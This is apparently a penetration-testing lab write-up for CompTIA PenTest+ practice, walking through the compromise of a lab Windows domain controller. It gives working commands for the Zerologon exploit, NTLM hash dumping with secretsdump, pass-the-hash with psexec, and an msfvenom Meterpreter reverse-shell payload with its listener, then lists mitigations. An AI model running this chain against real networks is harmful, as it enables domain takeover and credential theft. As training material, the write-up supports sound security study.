# 🔥 Live Lab: Using Metasploit – End-to-End Domain Compromise

## 📌 Overview
This lab demonstrates a full **penetration testing attack chain** using the **Metasploit Framework** and **Impacket** against a Windows Active Directory environment. The engagement simulates a real-world adversary workflow — from reconnaissance and enumeration to exploitation, credential dumping, lateral movement, and post-exploitation via Meterpreter.

The primary target is a **Windows Server 2019 Domain Controller (DC10)** within the Structureality internal network. All actions are performed remotely from a Kali Linux attack host.

---

## 🎯 Objectives
This lab aligns with **CompTIA PenTest+** objectives and real-world penetration testing methodology:

- Perform **network reconnaissance and service enumeration**
- Identify **domain controllers via exposed services**
- Exploit **CVE-2020-1472 (Zerologon)** for privilege escalation
- Dump **Active Directory NTLM hashes**
- Execute **Pass-the-Hash (PtH)** attacks
- Establish **remote command execution**
- Deploy and control a **Meterpreter reverse shell**
- Manage multiple sessions within Metasploit

---

## 🖥️ Lab Environment

### Attacker System
- **VM Name:** KALI  
- **OS:** Kali Linux  
- **Role:** Penetration Testing Workstation  
- **IP Address:** `10.1.16.66`

### Target System
- **VM Name:** DC10  
- **OS:** Windows Server 2019  
- **Role:** Domain Controller  
- **Domain:** `structureality.local`  
- **IP Address:** `10.1.16.1`

---

## 🧰 Tools & Technologies Used

- **Metasploit Framework (msfconsole, msfvenom)**
- **Nmap** (host & service discovery)
- **PostgreSQL** (Metasploit database backend)
- **Impacket Toolkit**
  - `secretsdump`
  - `psexec`
- **PowerShell**
- **Python HTTP Server**
- **Meterpreter**

---

## 🧭 Attack Methodology & Phases

### Phase 1 – Metasploit Initialization
- Started PostgreSQL database service
- Verified MSF database connectivity
- Launched Metasploit console

```bash
systemctl start postgresql
msfdb init
msfconsole
db_status
Phase 2 – Network Discovery & Enumeration
Conducted subnet scan using Nmap

Imported results into Metasploit

Enumerated hosts and services

Identified domain controller via LDAP & Kerberos

bash
Copy code
nmap 10.1.16.0/24 -F -A -oX targets.xml
db_import targets.xml
hosts
services
Phase 3 – Metasploit-Based Scanning
Performed SYN port scan using Metasploit auxiliary module

Enumerated SMB versions

Queried LDAP to confirm domain identity

bash
Copy code
use auxiliary/scanner/portscan/syn
use auxiliary/scanner/smb/smb_version
use auxiliary/gather/ldap_query
Confirmed Domain: structureality

Phase 4 – Exploitation (Zerologon)
Exploited CVE-2020-1472

Reset DC machine account password to null

bash
Copy code
use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
set NBNAME dc10
set RHOSTS 10.1.16.1
exploit
Phase 5 – Credential Dumping
Extracted NTLM hashes from Active Directory using DRSUAPI

Identified privileged accounts with reusable hashes

bash
Copy code
impacket-secretsdump -just-dc-ntlm structureality/dc10\$@10.1.16.1
Phase 6 – Lateral Movement (Pass-the-Hash)
Used stolen Administrator NTLM hash

Gained remote command execution on DC10

bash
Copy code
impacket-psexec structureality/administrator@10.1.16.1 -hashes <LMHASH:NTHASH>
Result: Remote C:\Windows\System32> shell on domain controller

Phase 7 – Payload Creation & Delivery
Created Meterpreter reverse TCP payload

Hosted payload via temporary web server

Transferred payload to target via PowerShell

bash
Copy code
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.1.16.66 LPORT=4567 -f exe -o secretfile.exe
python3 -m http.server 8080
Phase 8 – Meterpreter Session Establishment
Configured multi-handler listener

Executed payload on target

Established Meterpreter session

bash
Copy code
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.1.16.66
set LPORT 4567
run
Verified Access:

bash
Copy code
sysinfo
🚨 Security Impact
This lab demonstrates complete domain compromise from a remote attacker perspective:

Domain Controller password reset without authentication

Full credential disclosure (NTLM hashes)

Administrator-level remote command execution

Persistent post-exploitation access via Meterpreter

🛡️ Mitigation Recommendations
Patch CVE-2020-1472 (Zerologon)

Restrict anonymous Netlogon access

Enforce SMB signing

Monitor for abnormal machine account password resets

Disable NTLM where possible

Implement EDR with behavioral detection

Restrict lateral movement via network segmentation

Enable detailed AD & authentication logging

📸 Screenshot Proof (Suggested)

**https://imgur.com/a/yMrfivD**

Metasploit hosts and services output

Zerologon exploit success message

Secretsdump credential output

Impacket psexec shell on DC10

Meterpreter session confirmation (sysinfo)

🧠 Key Takeaways
This lab highlights how misconfigured authentication mechanisms, unpatched vulnerabilities, and credential reuse can rapidly lead to full domain compromise. It reinforces the importance of layered defenses, patch management, and proactive detection.
